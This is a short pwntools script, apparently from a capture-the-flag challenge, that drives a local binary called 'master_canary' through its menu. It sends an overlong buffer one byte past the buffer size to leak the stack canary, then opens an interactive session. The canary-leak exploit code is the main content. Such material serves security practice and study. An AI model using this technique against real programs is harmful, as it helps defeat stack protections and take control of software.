from pwn import *

context.update(log_level= 'debug')
p = process('master_canary')

p.recvrepeat(1)
raw_input('debug: ' + str(p.pid))
#Create a thread
p.sendline('1')

p.recvrepeat(1)
#Write data
p.sendline('2')

p.recvrepeat(1)

#Send size value
p.sendline(str(0x110-8 + 1))

p.recvrepeat(1)

#Send data
p.sendline('a'*(0x110-8 + 1))

#Saving the canary
_recv = p.recvrepeat(1).split('1.')[0][-7:]
log.info('recv: ' + _recv.encode('hex'))
#log.info('canary: ' + hex(canary))
p.interactive()
